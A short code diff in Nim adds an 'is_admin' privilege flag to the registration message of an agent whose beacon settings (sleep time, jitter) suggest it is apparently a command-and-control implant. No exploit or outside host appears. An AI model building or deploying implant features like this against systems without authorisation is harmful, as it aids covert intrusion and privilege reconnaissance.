@@ -105,6 +105,7 @@ proc doRegister(t: var AgentTransport): bool =
       "sleep_sec":    SleepSec,
       "jitter_pct":   JitterPct,
       "process_name": exeName(),
+      "is_admin":     isElevated(),
       "language":     "nim"
     }
   }
